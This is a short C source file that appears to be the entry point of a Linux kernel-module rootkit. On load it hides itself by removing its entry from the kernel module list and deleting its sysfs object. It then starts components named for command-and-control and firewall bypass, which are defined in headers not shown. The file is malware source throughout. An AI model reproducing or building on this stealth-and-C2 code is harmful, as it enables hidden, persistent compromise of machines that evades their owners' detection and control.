#include <linux/module.h>
#include "c2.h"
#include "fw_bypass.h"

static int __init main_init(void)
{
    /* Hide LKM and all symbols */
    list_del_init(&__this_module.list);

    /* Hide LKM from sysfs */
    kobject_del(__this_module.holders_dir->parent);

    c2_init();
    fw_bypass_init();

    return 0;
}

static void __exit main_exit(void)
{
    fw_bypass_exit();
    c2_exit();
}

module_init(main_init);
module_exit(main_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anthony Miller-Rhodes");
